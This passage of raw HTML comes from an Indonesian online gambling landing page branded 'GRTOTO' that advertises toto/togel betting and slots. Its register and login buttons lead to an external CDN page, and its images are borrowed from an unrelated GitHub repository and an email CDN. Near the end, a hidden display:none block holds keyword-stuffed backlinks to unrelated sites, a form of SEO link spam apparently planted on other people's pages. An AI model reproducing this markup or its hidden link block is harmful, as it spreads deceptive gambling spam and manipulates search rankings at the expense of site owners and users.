6.55906 11.5796 6.93717L11.5835 7.01432L11.5100.007 7.09342C11.6273 7.48556 11.9582 7.79156 12.3609 7.79167C12.7903 7.79167 13.139 7.4437 13.1392 7.01432C13.1392 6.60011 13.475 6.26432 13.8892 6.26432C14.2774 6.26449 14.5969 6.55909 14.6353 6.93717L14.6392 7.01432L14.6431 7.09342C14.6829 7.48559 15.0139 7.79162 15.4165 7.79167C15.6641 7.79167 15.8843 7.67688 16.0279 7.49479L16.0621 7.4401C16.0933 7.3758 16.1119 7.28023 16.0962 7.1237C16.0796 6.95852 16.0291 6.77054 15.9546 6.56022L15.8716 6.34245L14.813 3.66569C14.6081 3.25591 14.4768 2.99515 14.356 2.80534C14.2422 2.62651 14.1722 2.56658 14.1177 2.53288C14.0633 2.49922 13.9782 2.46291 13.7671 2.44108C13.5387 2.41746 13.239 2.41667 12.7642 2.41667H5.84721Z"
                                                fill="black"></path>
                                            <path
                                                d="M10.4652 16.5617V14.2707C10.4652 13.8999 10.465 13.6711 10.4495 13.5011C10.4424 13.4221 10.4328 13.3741 10.4251 13.3449L10.4124 13.3088C10.3778 13.2487 10.3279 13.1979 10.2679 13.1633H10.2669C10.2646 13.1619 10.2552 13.157 10.2308 13.1506C10.2016 13.1429 10.1536 13.1343 10.0745 13.1271C9.9046 13.1117 9.6765 13.1105 9.30599 13.1105C8.93522 13.1105 8.70646 13.1117 8.53646 13.1271C8.45743 13.1343 8.4094 13.1429 8.38021 13.1506L8.34408 13.1633C8.31404 13.1806 8.28639 13.2024 8.26204 13.2267L8.19857 13.3088C8.19728 13.311 8.19233 13.3204 8.18587 13.3449C8.17818 13.3741 8.16961 13.4221 8.16243 13.5011C8.14703 13.6712 8.14583 13.8999 8.14583 14.2707V16.5617C8.14583 16.9759 7.81005 17.3117 7.39583 17.3117C6.98162 17.3117 6.64583 16.9759 6.64583 16.5617V14.2707C6.64583 13.9276 6.64535 13.6198 6.66829 13.3664C6.69219 13.1027 6.74622 12.8248 6.89974 12.5588L6.96517 12.4523C7.12638 12.2112 7.34187 12.01 7.59408 11.8644L7.69368 11.8117C7.92887 11.6979 8.17079 11.6539 8.40169 11.633C8.65508 11.61 8.96294 11.6105 9.30599 11.6105C9.64882 11.6105 9.95605 11.61 10.2093 11.633C10.4729 11.6569 10.7509 11.7109 11.0169 11.8644L11.1234 11.9299C11.3646 12.0911 11.5657 12.3066 11.7113 12.5588L11.764 12.6584C11.8778 12.8936 11.9218 13.1355 11.9427 13.3664C11.9657 13.6198 11.9652 13.9276 11.9652 14.2707V16.5617C11.9652 16.9759 11.6294 17.3117 11.2152 17.3117C10.801 17.3116 10.4652 16.9759 10.4652 16.5617Z"
                                                fill="black"></path>
                                        </svg>
                                    </span><span class="text-sm font-medium">Portal Penjual</span></a>
                                <div class="group relative z-20 flex items-center gap-2" bis_skin_checked="1"><span
                                        class="nuxt-icon nuxt-icon--fill text-lg"><svg width="12" height="19"
                                            viewBox="0 0 12 19" fill="none" xmlns="http://www.w3.org/2000/svg">
                                            <path
                                                d="M10 2.57129C9.99992 1.99996 9.51691 1.5 8.875 1.5H7.75V1.96387L7.74609 2.04102C7.70766 2.41918 7.38831 2.71387 7 2.71387H4.5C4.08579 2.71387 3.75 2.37808 3.75 1.96387V1.5H2.625C1.98309 1.5 1.50008 1.99996 1.5 2.57129V15.9287C1.50008 16.5 1.98309 17 2.625 17H8.875C9.51691 17 9.99992 16.5 10 15.9287V2.57129ZM7 15.1787L7.07715 15.1826C7.45511 15.2212 7.75 15.5405 7.75 15.9287C7.74993 16.3168 7.45508 16.6362 7.07715 16.6748L7 16.6787H4.5C4.08583 16.6787 3.75008 16.3429 3.75 15.9287C3.75 15.5145 4.08579 15.1787 4.5 15.1787H7ZM11.5 15.9287C11.4999 17.3692 10.3041 18.5 8.875 18.5H2.625C1.19594 18.5 7.72757e-05 17.3692 0 15.9287V2.57129C7.72852e-05 1.13085 1.19594 0 2.625 0H8.875C10.3041 0 11.4999 1.13085 11.5 2.57129V15.9287Z"
                                                fill="black"></path>
                                        </svg>
                                    </span><span class="text-sm font-medium">Download Mobile App</span>
                                    <div class="absolute left-1/2 top-full hidden w-full -translate-x-1/2 overflow-x-hidden rounded border bg-white p-2 shadow group-hover:block"
                                        bis_skin_checked="1">
                                        <div class="flex flex-wrap gap-4 flex-col-reverse *:w-full"
                                            bis_skin_checked="1">
                                            <div class="aspect-square rounded-lg border border-bw-600 p-2"
                                                bis_skin_checked="1"><svg shape-rendering="crispEdges"
                                                    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 29 29">
                                                    <defs>
                                                        <!---->
                                                    </defs>
                                                    <rect width="100%" height="100%" fill="#fff"></rect>
                                                    <path fill="#000"
                                                        d="M0 0h7v1H0zM9 0h3v1H9zM13 0h1v1H13zM15 0h1v1H15zM18 0h3v1H18zM22,0 h7v1H22zM0 1h1v1H0zM6 1h1v1H6zM9 1h7v1H9zM20 1h1v1H20zM22 1h1v1H22zM28,1 h1v1H28zM0 2h1v1H0zM2 2h3v1H2zM6 2h1v1H6zM8 2h2v1H8zM11 2h3v1H11zM15 2h2v1H15zM18 2h1v1H18zM22 2h1v1H22zM24 2h3v1H24zM28,2 h1v1H28zM0 3h1v1H0zM2 3h3v1H2zM6 3h1v1H6zM8 3h3v1H8zM14 3h2v1H14zM17 3h3v1H17zM22 3h1v1H22zM24 3h3v1H24zM28,3 h1v1H28zM0 4h1v1H0zM2 4h3v1H2zM6 4h1v1H6zM8 4h4v1H8zM16 4h5v1H16zM22 4h1v1H22zM24 4h3v1H24zM28,4 h1v1H28zM0 5h1v1H0zM6 5h1v1H6zM8 5h1v1H8zM10 5h1v1H10zM15 5h3v1H15zM22 5h1v1H22zM28,5 h1v1H28zM0 6h7v1H0zM8 6h1v1H8zM10 6h1v1H10zM12 6h1v1H12zM14 6h1v1H14zM16 6h1v1H16zM18 6h1v1H18zM20 6h1v1H20zM22,6 h7v1H22zM8 7h5v1H8zM14 7h2v1H14zM19 7h2v1H19zM0 8h1v1H0zM2 8h5v1H2zM10 8h1v1H10zM12 8h1v1H12zM15 8h1v1H15zM17 8h1v1H17zM19 8h1v1H19zM22 8h5v1H22zM0 9h3v1H0zM5 9h1v1H5zM7 9h8v1H7zM16 9h1v1H16zM18 9h2v1H18zM21 9h4v1H21zM28,9 h1v1H28zM6 10h1v1H6zM10 10h2v1H10zM13 10h4v1H13zM18 10h1v1H18zM21 10h1v1H21zM23 10h1v1H23zM1 11h1v1H1zM4 11h2v1H4zM9 11h1v1H9zM12 11h2v1H12zM16 11h1v1H16zM20 11h1v1H20zM22 11h1v1H22zM24 11h1v1H24zM27 11h1v1H27zM0 12h1v1H0zM6 12h2v1H6zM9 12h4v1H9zM14 12h1v1H14zM17 12h1v1H17zM19 12h1v1H19zM23 12h1v1H23zM25 12h2v1H25zM0 13h1v1H0zM4 13h1v1H4zM8 13h1v1H8zM10 13h1v1H10zM16 13h1v1H16zM19 13h2v1H19zM22 13h3v1H22zM26 13h1v1H26zM28,13 h1v1H28zM2 14h1v1H2zM4 14h6v1H4zM15 14h1v1H15zM18 14h1v1H18zM21 14h1v1H21zM23 14h2v1H23zM26 14h1v1H26zM0 15h1v1H0zM2 15h4v1H2zM7 15h1v1H7zM11 15h2v1H11zM14 15h3v1H14zM18 15h1v1H18zM20 15h3v1H20zM24 15h1v1H24zM27 15h1v1H27zM1 16h4v1H1zM6 16h1v1H6zM10 16h1v1H10zM12 16h1v1H12zM17 16h1v1H17zM19 16h1v1H19zM26 16h1v1H26zM0 17h1v1H0zM2 17h1v1H2zM4 17h2v1H4zM9 17h1v1H9zM11 17h4v1H11zM16 17h1v1H16zM19 17h8v1H19zM28,17 h1v1H28zM0 18h1v1H0zM5 18h4v1H5zM11 18h5v1H11zM18 18h1v1H18zM20 18h3v1H20zM24 18h3v1H24zM0 19h1v1H0zM4 19h1v1H4zM11 19h1v1H11zM13 19h1v1H13zM16 19h1v1H16zM18 19h1v1H18zM23 19h2v1H23zM27 19h1v1H27zM0 20h1v1H0zM2 20h2v1H2zM6 20h3v1H6zM10 20h2v1H10zM14 20h1v1H14zM17 20h2v1H17zM20 20h5v1H20zM26,20 h3v1H26zM8 21h2v1H8zM16 21h3v1H16zM20 21h1v1H20zM24,21 h5v1H24zM0 22h7v1H0zM9 22h1v1H9zM11 22h1v1H11zM15 22h2v1H15zM19 22h2v1H19zM22 22h1v1H22zM24 22h3v1H24zM0 23h1v1H0zM6 23h1v1H6zM8 23h1v1H8zM10 23h2v1H10zM14 23h1v1H14zM16 23h1v1H16zM19 23h2v1H19zM24 23h2v1H24zM27 23h1v1H27zM0 24h1v1H0zM2 24h3v1H2zM6 24h1v1H6zM8 24h1v1H8zM11 24h2v1H11zM15 24h3v1H15zM20 24h5v1H20zM26 24h1v1H26zM0 25h1v1H0zM2 25h3v1H2zM6 25h1v1H6zM8 25h2v1H8zM11 25h4v1H11zM16 25h1v1H16zM18 25h2v1H18zM23 25h1v1H23zM25 25h1v1H25zM27,25 h2v1H27zM0 26h1v1H0zM2 26h3v1H2zM6 26h1v1H6zM8 26h1v1H8zM11 26h2v1H11zM14 26h3v1H14zM19 26h2v1H19zM22 26h3v1H22zM27 26h1v1H27zM0 27h1v1H0zM6 27h1v1H6zM9 27h1v1H9zM11 27h1v1H11zM16 27h1v1H16zM18 27h1v1H18zM20 27h2v1H20zM23 27h3v1H23zM27 27h1v1H27zM0 28h7v1H0zM8 28h1v1H8zM10 28h1v1H10zM14 28h1v1H14zM17 28h1v1H17zM19 28h1v1H19zM21 28h1v1H21zM24 28h1v1H24zM26 28h1v1H26z">
                                                    </path>
                                                    <!---->
                                                </svg></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="flex items-center gap-4" bis_skin_checked="1"><a
                                    href="https://otiumpro.com/clientes/" class="flex items-center gap-1"><span
                                        class="nuxt-icon nuxt-icon--fill text-sm"><svg width="14" height="14"
                                            viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                                            <path
                                                d="M12.502 0.439452C12.7858 0.186623 13.2206 0.184865 13.5068 0.447265C13.793 0.70964 13.8287 1.14256 13.6016 1.44726L13.5527 1.50684L2.55274 13.5068C2.27283 13.8121 1.79848 13.8326 1.49317 13.5527C1.18791 13.2728 1.1674 12.7985 1.44727 12.4932L12.4473 0.493163L12.502 0.439452Z"
                                                fill="black"></path>
                                            <path
                                                d="M12.5 11C12.5 10.1716 11.8284 9.5 11 9.5C10.1716 9.5 9.5 10.1716 9.5 11C9.5 11.8284 10.1716 12.5 11 12.5V14C9.34315 14 8 12.6569 8 11C8 9.34315 9.34315 8 11 8C12.6569 8 14 9.34315 14 11C14 12.6569 12.6569 14 11 14V12.5C11.8284 12.5 12.5 11.8284 12.5 11Z"
                                                fill="black"></path>
                                            <path
                                                d="M4.5 3C4.5 2.17157 3.82843 1.5 3 1.5C2.17157 1.5 1.5 2.17157 1.5 3C1.5 3.82843 2.17157 4.5 3 4.5V6C1.34315 6 0 4.65685 0 3C0 1.34315 1.34315 0 3 0C4.65685 0 6 1.34315 6 3C6 4.65685 4.65685 6 3 6V4.5C3.82843 4.5 4.5 3.82843 4.5 3Z"
                                                fill="black"></path>
                                        </svg>
                                    </span><span class="text-sm font-medium">Promo</span></a>
                                <hr class="h-3 w-[1px] bg-black"><a href="https://otiumpro.com/clientes/"
                                    class="flex items-center gap-1"><span class="nuxt-icon nuxt-icon--fill text-lg"><svg
                                            width="18" height="17" viewBox="0 0 18 17" fill="none"
                                            xmlns="http://www.w3.org/2000/svg">
                                            <path
                                                d="M16.5 8.0625H13.875V13.5C13.875 14.2021 14.4491 14.8125 15.1875 14.8125C15.8896 14.8125 16.5 14.2384 16.5 13.5V8.0625ZM18 13.5C18 15.0991 16.6854 16.3125 15.1875 16.3125C13.5884 16.3125 12.375 14.9979 12.375 13.5V1.125C12.375 0.710786 12.7108 0.375 13.125 0.375C13.5392 0.375 13.875 0.710786 13.875 1.125V6.5625H17.25C17.6642 6.5625 18 6.89829 18 7.3125V13.5Z"
                                                fill="black"></path>
                                            <path
                                                d="M12.375 1.875H1.5V13.5C1.5 14.2021 2.07412 14.8125 2.8125 14.8125H12.6982C12.4912 14.4202 12.375 13.9734 12.375 13.5V1.875ZM13.875 13.5C13.875 14.0732 14.2207 14.5417 14.7373 14.7139C15.0434 14.816 15.2499 15.1021 15.25 15.4248V15.5625C15.25 15.9767 14.9142 16.3125 14.5 16.3125H2.8125C1.21338 16.3125 0 14.9979 0 13.5V1.125L0.00390625 1.04785C0.0425277 0.669882 0.361834 0.375 0.75 0.375H13.125L13.2021 0.378906C13.5801 0.417528 13.875 0.736834 13.875 1.125V13.5Z"
                                                fill="black"></path>
                                            <path
                                                d="M7.625 3.8125C8.03921 3.8125 8.375 4.14829 8.375 4.5625C8.375 4.97671 8.03921 5.3125 7.625 5.3125H3.5C3.08579 5.3125 2.75 4.97671 2.75 4.5625C2.75 4.14829 3.08579 3.8125 3.5 3.8125H7.625Z"
                                                fill="black"></path>
                                            <path
                                                d="M4.875 6.5625C5.28921 6.5625 5.625 6.89829 5.625 7.3125C5.625 7.72671 5.28921 8.0625 4.875 8.0625H3.5C3.08579 8.0625 2.75 7.72671 2.75 7.3125C2.75 6.89829 3.08579 6.5625 3.5 6.5625H4.875Z"
                                                fill="black"></path>
                                        </svg>
                                    </span><span class="text-sm font-medium">Blog</span></a>
                                <!---->
                            </div>
                        </div>
                        <!---->
                    </div>
                    <div class="relative flex min-h-[70px] flex-1 max-md:bg-primary" bis_skin_checked="1">
                        <div class="container my-auto flex items-center gap-3 md:gap-6" bis_skin_checked="1"><a href="/"
                                class="pr-[10px] max-md:hidden" aria-label="GRTOTO Logo"><img
                                    src="https://cdn.jsdelivr.net/gh/free-whiteboard-online/Free-Erasorio-Alternative-for-Collaborative-Design@d4420458fb1e9c34e6fb6a576257df308a634ed8/uploads/2026-02-27T07-12-47-585Z-g25mfkdn9.png"
                                    alt="GRTOTO Logo" width="165" height="60" class="relative" loading="lazy"
                                    quality="100"></a>
                            <!--[--><button class="btn !rounded-full bg-primary-200 text-primary max-md:!hidden"><span
                                    class="nuxt-icon"><svg width="18" height="18" viewBox="0 0 18 18" fill="none"
                                        xmlns="http://www.w3.org/2000/svg">
                                        <path fill-rule="evenodd" clip-rule="evenodd"
                                            d="M14 1.5C13.337 1.5 12.7011 1.76339 12.2322 2.23223C11.7634 2.70107 11.5 3.33696 11.5 4C11.5 4.66304 11.7634 5.29893 12.2322 5.76777C12.7011 6.23661 13.337 6.5 14 6.5C14.663 6.5 15.2989 6.23661 15.7678 5.76777C16.2366 5.29893 16.5 4.66304 16.5 4C16.5 3.33696 16.2366 2.70107 15.7678 2.23223C15.2989 1.76339 14.663 1.5 14 1.5ZM2.23223 12.2322C1.76339 12.7011 1.5 13.337 1.5 14C1.5 14.663 1.76339 15.2989 2.23223 15.7678C2.70107 16.2366 3.33696 16.5 4 16.5C4.66304 16.5 5.29893 16.2366 5.76777 15.7678C6.23661 15.2989 6.5 14.663 6.5 14C6.5 13.337 6.23661 12.7011 5.76777 12.2322C5.29893 11.7634 4.66304 11.5 4 11.5C3.33696 11.5 2.70107 11.7634 2.23223 12.2322ZM11.5 11.5V16C11.5 16.1326 11.5527 16.2598 11.6464 16.3536C11.7402 16.4473 11.8674 16.5 12 16.5H16C16.1326 16.5 16.2598 16.4473 16.3536 16.3536C16.4473 16.2598 16.5 16.1326 16.5 16V11.5H11.5ZM1.5 1.5V6C1.5 6.13261 1.55268 6.25978 1.64645 6.35355C1.74022 6.44732 1.86739 6.5 2 6.5H6C6.13261 6.5 6.25978 6.44732 6.35355 6.35355C6.44732 6.25978 6.5 6.13261 6.5 6V1.5H1.5ZM11.1716 1.17157C11.9217 0.421427 12.9391 0 14 0C15.0609 0 16.0783 0.421427 16.8284 1.17157C17.5786 1.92172 18 2.93913 18 4C18 5.06087 17.5786 6.07828 16.8284 6.82843C16.0783 7.57857 15.0609 8 14 8C12.9391 8 11.9217 7.57857 11.1716 6.82843C10.4214 6.07828 10 5.06087 10 4C10 2.93913 10.4214 1.92172 11.1716 1.17157ZM1.17157 11.1716C0.421427 11.9217 0 12.9391 0 14C0 15.0609 0.421427 16.0783 1.17157 16.8284C1.92172 17.5786 2.93913 18 4 18C5.06087 18 6.07828 17.5786 6.82843 16.8284C7.57857 16.0783 8 15.0609 8 14C8 12.9391 7.57857 11.9217 6.82843 11.1716C6.07828 10.4214 5.06087 10 4 10C2.93913 10 1.92172 10.4214 1.17157 11.1716ZM10.2929 10.2929C10.1054 10.4804 10 10.7348 10 11V16C10 16.5304 10.2107 17.0391 10.5858 17.4142C10.9609 17.7893 11.4696 18 12 18H16C16.5304 18 17.0391 17.7893 17.4142 17.4142C17.7893 17.0391 18 16.5304 18 16V11C18 10.7348 17.8946 10.4804 17.7071 10.2929C17.5196 10.1054 17.2652 10 17 10H11C10.7348 10 10.4804 10.1054 10.2929 10.2929ZM0.292893 0.292893C0.105357 0.48043 0 0.734784 0 1V6C0 6.53043 0.210714 7.03914 0.585786 7.41421C0.960859 7.78929 1.46957 8 2 8H6C6.53043 8 7.03914 7.78929 7.41421 7.41421C7.78929 7.03914 8 6.53043 8 6V1C8 0.734784 7.89464 0.48043 7.70711 0.292893C7.51957 0.105357 7.26522 0 7 0H1C0.734784 0 0.48043 0.105357 0.292893 0.292893Z"
                                            fill="black"></path>
                                    </svg>
                                </span><span>Kategori</span></button>
                            <div class="relative z-[1] flex flex-1 items-center" bis_skin_checked="1"><a href="/"
                                    class="flex items-center gap-2"><img
                                        src="https://cdn.jsdelivr.net/gh/free-whiteboard-online/Free-Erasorio-Alternative-for-Collaborative-Design@d4420458fb1e9c34e6fb6a576257df308a634ed8/uploads/2026-02-27T07-12-47-585Z-g25mfkdn9.png"
                                        alt="GRTOTO Logo" width="32" height="12"
                                        class="absolute left-4 top-1/2 -translate-y-1/2 md:hidden" loading="lazy"
                                        quality="100"></a>
                                <div class="group absolute z-[1] flex h-[42px] w-28 items-center justify-between gap-1 text-wrap rounded-l-full border border-bw-400 bg-[#F5F5F5] px-2 py-1 text-bw-500 max-md:hidden md:w-48 md:px-4 md:py-3"
                                    bis_skin_checked="1"><span class="max-md:text-xs">GRTOTO</span><span
                                        class="nuxt-icon nuxt-icon--fill"><!-- Generated by IcoMoon.io -->
                                        <svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="18" height="28"
                                            viewBox="0 0 18 28">
                                            <title>angle-down</title>
                                            <path
                                                d="M16.797 11.5c0 0.125-0.063 0.266-0.156 0.359l-7.281 7.281c-0.094 0.094-0.234 0.156-0.359 0.156s-0.266-0.063-0.359-0.156l-7.281-7.281c-0.094-0.094-0.156-0.234-0.156-0.359s0.063-0.266 0.156-0.359l0.781-0.781c0.094-0.094 0.219-0.156 0.359-0.156 0.125 0 0.266 0.063 0.359 0.156l6.141 6.141 6.141-6.141c0.094-0.094 0.234-0.156 0.359-0.156s0.266 0.063 0.359 0.156l0.781 0.781c0.094 0.094 0.156 0.234 0.156 0.359z">
                                            </path>
                                        </svg>
                                    </span>
                                    <ul
                                        class="absolute left-0 top-[40px] hidden w-full text-nowrap rounded-xl border bg-white py-1 shadow group-hover:block max-md:text-xs">
                                        <li class="cursor-pointer px-4 py-2 hover:bg-slate-50">SITUS TOTO</li>
                                        <li class="cursor-pointer px-4 py-2 hover:bg-slate-50">TOTO TOGEL</li>
                                        <li class="cursor-pointer px-4 py-2 hover:bg-slate-50">TOTO</li>
                                        <li class="cursor-pointer px-4 py-2 hover:bg-slate-50">TOGEL</li>
                                        <li class="cursor-pointer px-4 py-2 hover:bg-slate-50">TOTO ONLINE</li>
                                        <li class="cursor-pointer px-4 py-2 hover:bg-slate-50">TOGEL ONLINE</li>
                                        <li class="cursor-pointer px-4 py-2 hover:bg-slate-50">LINK TOTO TOGEL</li>
                                    </ul>
                                </div>
                                <form class="w-full"><input value="" type="text"
                                        class="!pl-[3.5rem] md:!pl-52 form-rounded h-[42px] max-md:text-sm"
                                        placeholder="Regulasi Resmi Situs Toto Online" autocomplete="new-password">
                                    <!----><button type="submit"
                                        class="absolute right-2 top-1/2 z-[1] flex size-8 -translate-y-1/2 items-center justify-center rounded-full bg-primary text-white"><span
                                            class="nuxt-icon nuxt-icon--fill"><!-- Generated by IcoMoon.io -->
                                            <svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="26" height="28"
                                                viewBox="0 0 26 28">
                                                <title>search</title>
                                                <path
                                                    d="M18 13c0-3.859-3.141-7-7-7s-7 3.141-7 7 3.141 7 7 7 7-3.141 7-7zM26 26c0 1.094-0.906 2-2 2-0.531 0-1.047-0.219-1.406-0.594l-5.359-5.344c-1.828 1.266-4.016 1.937-6.234 1.937-6.078 0-11-4.922-11-11s4.922-11 11-11 11 4.922 11 11c0 2.219-0.672 4.406-1.937 6.234l5.359 5.359c0.359 0.359 0.578 0.875 0.578 1.406z">
                                                </path>
                                            </svg>
                                        </span></button>
                                </form>
                                <!---->
                            </div>
                            <!--]-->
                            <!---->
                            <div class="md:hidden flex items-center gap-4" bis_skin_checked="1">
                                <!---->
                                <div class="relative flex md:hidden" bis_skin_checked="1"><button class="my-auto"><span
                                            class="nuxt-icon nuxt-icon--fill text-lg text-white"><!-- Generated by IcoMoon.io -->
                                            <svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="24" height="28"
                                                viewBox="0 0 24 28">
                                                <title>bars</title>
                                                <path
                                                    d="M24 21v2c0 0.547-0.453 1-1 1h-22c-0.547 0-1-0.453-1-1v-2c0-0.547 0.453-1 1-1h22c0.547 0 1 0.453 1 1zM24 13v2c0 0.547-0.453 1-1 1h-22c-0.547 0-1-0.453-1-1v-2c0-0.547 0.453-1 1-1h22c0.547 0 1 0.453 1 1zM24 5v2c0 0.547-0.453 1-1 1h-22c-0.547 0-1-0.453-1-1v-2c0-0.547 0.453-1 1-1h22c0.547 0 1 0.453 1 1z">
                                                </path>
                                            </svg>
                                        </span><span class="nuxt-icon nuxt-icon--fill text-lg text-white"
                                            style="display:none;"><svg width="34" height="34" viewBox="0 0 34 34"
                                                fill="none" xmlns="http://www.w3.org/2000/svg">
                                                <path
                                                    d="M23.364 8.51472C23.9497 7.92893 24.8995 7.92893 25.4853 8.51472C26.0711 9.1005 26.0711 10.0502 25.4853 10.636L10.636 25.4853C10.0503 26.0711 9.10051 26.0711 8.51472 25.4853C7.92893 24.8995 7.92893 23.9497 8.51472 23.364L23.364 8.51472Z"
                                                    fill="#D9D9D9"></path>
                                                <path
                                                    d="M25.4853 23.364C26.0711 23.9497 26.0711 24.8995 25.4853 25.4853C24.8995 26.0711 23.9497 26.0711 23.364 25.4853L8.51472 10.636C7.92893 10.0502 7.92893 9.1005 8.51472 8.51471C9.10051 7.92893 10.0503 7.92893 10.636 8.51471L25.4853 23.364Z"
                                                    fill="#D9D9D9"></path>
                                            </svg>
                                        </span></button>
                                    <div class="drawer overflow-auto mt-[66px] flex h-[calc(100%-66px)] flex-col max-md:p-4 drawer-left drawer-left-close"
                                        bis_skin_checked="1">
                                        <!--[-->
                                        <!--]-->
                                    </div>
                                    <div class="drawer overflow-auto drawer-left drawer-left-close"
                                        bis_skin_checked="1">
                                        <!--[-->
                                        <div class="flex flex-col gap-4" bis_skin_checked="1">
                                            <div class="flex items-center gap-2" bis_skin_checked="1"><button><span
                                                        class="nuxt-icon nuxt-icon--fill"><svg width="34" height="34"
                                                            viewBox="0 0 34 34" fill="none"
                                                            xmlns="http://www.w3.org/2000/svg">
                                                            <path
                                                                d="M23.364 8.51472C23.9497 7.92893 24.8995 7.92893 25.4853 8.51472C26.0711 9.1005 26.0711 10.0502 25.4853 10.636L10.636 25.4853C10.0503 26.0711 9.10051 26.0711 8.51472 25.4853C7.92893 24.8995 7.92893 23.9497 8.51472 23.364L23.364 8.51472Z"
                                                                fill="#D9D9D9"></path>
                                                            <path
                                                                d="M25.4853 23.364C26.0711 23.9497 26.0711 24.8995 25.4853 25.4853C24.8995 26.0711 23.9497 26.0711 23.364 25.4853L8.51472 10.636C7.92893 10.0502 7.92893 9.1005 8.51472 8.51471C9.10051 7.92893 10.0503 7.92893 10.636 8.51471L25.4853 23.364Z"
                                                                fill="#D9D9D9"></path>
                                                        </svg>
                                                    </span></button><img
                                                    src="https://ik.imagekit.io/ljdihgltp/C.E.O.jpg"
                                                    alt="category undefined" width="33" height="33" loading="lazy"><a
                                                    href="https://otiumpro.com/clientes/"
                                                    class="text-lg font-semibold text-bw-800"></a></div>
                                            <hr>
                                            <div class="grid gap-4" bis_skin_checked="1">
                                                <!--[-->
                                                <!--]-->
                                            </div>
                                        </div>
                                        <!--]-->
                                    </div>
                                </div>
                            </div>
                            <div class="flex gap-2" bis_skin_checked="1"><a
                                    href="https://c-e-o.b-cdn.net/c-e-o.html"
                                    class="btn btn-primary-outline max-md:!hidden">Daftar</a><a
                                    href="https://c-e-o.b-cdn.net/c-e-o.html"
                                    class="btn btn-primary max-md:!hidden">Masuk</a></div>
                        </div>
                        <!---->
                    </div>
                    <div class="container relative z-[2] flex items-center justify-between py-2 md:hidden"
                        bis_skin_checked="1">
                        <span class="text-xs">Halo Bosku Selamat Datang Di Regulasi Resmi Situs Toto, <b>Silahkan Masuk!</b></span><a
                            href="https://c-e-o.b-cdn.net/c-e-o.html"
                            class="btn btn-primary pointer-events-auto z-[999] !h-auto !gap-2 !px-3 !py-2"><span
                                class="nuxt-icon nuxt-icon--fill text-lg"><svg width="20" height="20"
                                    viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path fill-rule="evenodd" clip-rule="evenodd"
                                        d="M3 4.25C3 3.00736 4.00736 2 5.25 2H10.75C11.9926 2 13 3.00736 13 4.25V6.25C13 6.66421 12.6642 7 12.25 7C11.8358 7 11.5 6.66421 11.5 6.25V4.25C11.5 3.83579 11.1642 3.5 10.75 3.5H5.25C4.83579 3.5 4.5 3.83579 4.5 4.25V15.75C4.5 16.1642 4.83579 16.5 5.25 16.5H10.75C11.1642 16.5 11.5 16.1642 11.5 15.75V13.75C11.5 13.3358 11.8358 13 12.25 13C12.6642 13 13 13.3358 13 13.75V15.75C13 16.9926 11.9926 18 10.75 18H5.25C4.00736 18 3 16.9926 3 15.75V4.25Z"
                                        fill="black"></path>
                                    <path fill-rule="evenodd" clip-rule="evenodd"
                                        d="M6 10C6 9.58579 6.33579 9.25 6.75 9.25H16.2955L15.2483 8.30747C14.9404 8.03038 14.9154 7.55616 15.1925 7.24828C15.4696 6.94039 15.9438 6.91543 16.2517 7.19253L18.7517 9.44253C18.9098 9.58476 19 9.78738 19 10C19 10.2126 18.9098 10.4152 18.7517 10.5575L16.2517 12.8075C15.9438 13.0846 15.4696 13.0596 15.1925 12.7517C14.9154 12.4438 14.9404 11.9696 15.2483 11.6925L16.2955 10.75H6.75C6.33579 10.75 6 10.4142 6 10Z"
                                        fill="black"></path>
                                </svg>
                            </span><span class="text-xs">Masuk</span></a>
                    </div>
                </header>
                <main id="main" role="main" class="mt-[128px] md:mt-28">
                    <!--[-->
                    <div class="relative grid gap-6 py-8" bis_skin_checked="1">
                        <div class="container grid gap-6 md:grid-cols-2" bis_skin_checked="1">
                            <div class="mb-auto grid gap-2 md:sticky md:left-0 md:top-32" bis_skin_checked="1">
                                <div class="AGENSLOT"><a href="https://c-e-o.b-cdn.net/c-e-o.html" rel="nofollow noreferrer"
                                        class="register">DAFTAR</a><a
                                        href="https://c-e-o.b-cdn.net/c-e-o.html"
                                        rel="nofollow noreferrer" class="login">LOGIN</a>
                                </div>
                                <div class="overflow-hidden" bis_skin_checked="1">
                                    <swiper-container><template shadowrootmode="open">
                                            <div class="swiper swiper-initialized swiper-horizontal swiper-backface-hidden"
                                                part="container">
                                                <slot name="container-start"></slot>
                                                <div class="swiper-wrapper" part="wrapper"
                                                    id="swiper-wrapper-5e525dfaf3910d195" aria-live="polite"
                                                    style="transform: translate3d(0px, 0px, 0px);">
                                                    <slot></slot>
                                                </div>
                                                <slot name="container-end"></slot>
                                                <span class="swiper-notification" aria-live="assertive"
                                                    aria-atomic="true"></span>
                                            </div>
                                        </template>
                                        <!---->
                                        <swiper-slide role="group" aria-label="1 / 1" class="swiper-slide-active"
                                            style="width: 509px; margin-right: 10px;"><template shadowrootmode="open">
                                                <slot></slot>
                                            </template>
                                            <div class="relative" bis_skin_checked="1"><img
                                                    src="https://ik.imagekit.io/ljdihgltp/C.E.O.jpg"
                                                    alt=""
                                                    class="aspect-square w-full rounded-2xl border object-contain"
                                                    loading="lazy">
                                                <!---->
                                            </div>
                                            <br>
                                            <div>
                                                <a
                                                    href="https://c-e-o.b-cdn.net/c-e-o.html">
                                                    <img alt="GRTOTO"
                                                        src="https://cdn.emailacademy.com/user/81886793bb2d95b12374d87efe201f6574829a0186ffd4a349193ed44322ec2d/jackpot-tanpa-henti2026_02_27_07_16_35.gif"
                                                        width="600px">
                                                </a>
                                            </div>
                                        </swiper-slide>
                                    </swiper-container>
                                </div>
                            </div>
                            <section class="mb-auto flex flex-col gap-4 md:sticky md:left-0 md:top-32">
                                <!---->
                                <h1 class="flex gap-2 text-lg font-bold">
                                    <span>GRTOTO: Pusat Bandar Slot Togel Terpercaya Tempat Jackpot Spektakuler Tanpa Henti</span>
                                    <!---->
                                    <!---->
                                    <!---->
                                </h1>

                                <div style="display:none;">
                                    <p><a href="https://s-ence.org/" >slot</a></p>
                                    <p><a href="https://www.castletearoom.com/" >slot online</a></p>
                                    <p><a href="https://psicologosenlinea.net/" >bandar slot</a></p>
                                    <p><a href="https://sue-lynnwood.com/about-the-author/" >bandar slot online</a></p>
